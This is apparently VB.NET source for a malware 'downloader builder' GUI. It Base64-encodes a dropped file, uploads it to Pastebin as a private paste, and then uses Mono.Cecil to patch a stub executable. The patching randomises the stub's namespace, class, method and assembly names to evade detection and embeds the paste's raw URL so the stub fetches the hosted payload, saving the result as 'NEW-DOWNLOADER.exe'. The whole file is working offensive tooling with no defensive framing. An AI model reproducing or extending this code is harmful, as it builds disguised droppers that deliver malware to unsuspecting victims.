Imports Mono.Cecil
Imports Mono.Cecil.Cil

'Credit Icon http://www.iconarchive.com
'Credit Theme Carter (CH)
'Credit Pastebin Class 'https://pastebin.com/raw/pWsqxAjG

Public Class Form1

    Public URL As String
    Public Basex64 As String

    Private Sub RichTextBox1_DragDrop(sender As Object, e As DragEventArgs) Handles RichTextBox1.DragDrop
        RichTextBox1.Clear()
        e.Effect = 0
        If ChTextbox1.Text = "" Then MsgBox("Enter API", MsgBoxStyle.Exclamation) : Return Else

        My.Settings.API = ChTextbox1.Text

        Try
            Dim file() As String = e.Data.GetData(DataFormats.FileDrop)
            For Each path In file
                Basex64 = ToBase64String(System.Text.Encoding.Default.GetString(IO.File.ReadAllBytes(path)))
            Next
            PasteBinUpload(ChTextbox1.Text, Basex64, "Untitled", "text", True, "N", "")
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try

        Try
            Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\Stub\stub.exe"))
            Dim definition2 As ModuleDefinition
            For Each definition2 In definition.Modules
                If definition2.Name = "Stub.exe" Then definition2.Name = Randomi(4) + ".exe"
                definition.Name = New AssemblyNameDefinition(Randomi(4), New Version("1.0.0.0"))
                Dim definition3 As TypeDefinition
                For Each definition3 In definition2.Types
                    If definition3.Namespace = "Stub" Then definition3.Namespace = Randomi(5)
                    If definition3.Name = "XMYCLASSx" Then definition3.Name = Randomi(4)
                    Dim definition4 As MethodDefinition
                    For Each definition4 In definition3.Methods
                        If definition4.Name = "XDW" Then definition4.Name = Randomi(5)

                        If (definition4.IsConstructor AndAlso definition4.HasBody) Then
                            Dim enumerator As IEnumerator(Of Instruction)
                            Try
                                enumerator = definition4.Body.Instructions.GetEnumerator
                                Do While enumerator.MoveNext
                                    Dim current As Instruction = enumerator.Current
                                    If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                        Dim str As String = current.Operand.ToString
                                        If (str = "<URL>") Then current.Operand = Convert.ToBase64String(System.Text.Encoding.Default.GetBytes(URL))
                                    End If
                                Loop
                            Finally
                            End Try

                        End If
                    Next
                Next
            Next

            definition.Write(Application.StartupPath + "\" + "NEW-DOWNLOADER.exe")
            MsgBox("Your Downlaoder Has been Created Successfully", vbInformation, "DONE!")

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try
    End Sub

    Private Function Randomi(ByVal lenght As Integer) As String
        Dim validchars As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        Dim sb As New Text.StringBuilder()
        Dim rand As New Random()
        For i As Integer = 1 To lenght
            Dim idx As Integer = rand.Next(0, validchars.Length)
            Dim randomChar As String = validchars(idx)
            sb.Append(randomChar)
        Next
        Return sb.ToString
    End Function

    Private Function PasteBinUpload(ByVal DevKey As String, ByVal Code As String, Optional ByVal Name As String = "Untitled", Optional ByVal Format As String = "text", Optional ByVal Priv As Boolean = True, Optional ByVal Expiry As String = "N", Optional ByVal UserKey As String = "") As String
        Try
            Dim pr As Integer = If(Priv, 1, 0)
            Dim postdata As String = "&api_paste_private=" & pr & "&api_paste_format=" & Format & "&api_paste_code=" & Code & "&api_paste_name=" & Name & "&api_dev_key=" & DevKey & "&api_option=paste" & "&api_user_key=" & UserKey & "&api_paste_expire_date=" & Expiry
            Dim req As Net.HttpWebRequest = Net.HttpWebRequest.Create("https://pastebin.com/api/api_post.php")
            req.KeepAlive = True
            req.Method = "POST"
            req.ContentType = "application/x-www-form-urlencoded"
            Dim byteArray As Byte() = System.Text.Encoding.UTF8.GetBytes(postdata)
            req.ContentLength = byteArray.Length
            Dim dataStream As System.IO.Stream = req.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As System.Net.HttpWebResponse = req.GetResponse()
            dataStream = response.GetResponseStream()
            Dim reader As New System.IO.StreamReader(dataStream)
            Dim responseFromServer As String = reader.ReadToEnd()
            URL = "https://pastebin.com/raw/" + responseFromServer.Split("/")(3)
            Return ""
        Catch ex As Exception
        End Try
    End Function

    Private Function ToBase64String(input As String)
        Try
            Return Convert.ToBase64String(System.Text.Encoding.Default.GetBytes(input))
        Catch ex As Exception
        End Try
    End Function

    Private Sub ChControlbutton1_Click(sender As Object, e As EventArgs) Handles ChControlbutton1.Click
        My.Settings.Save()
        End
    End Sub
End Class
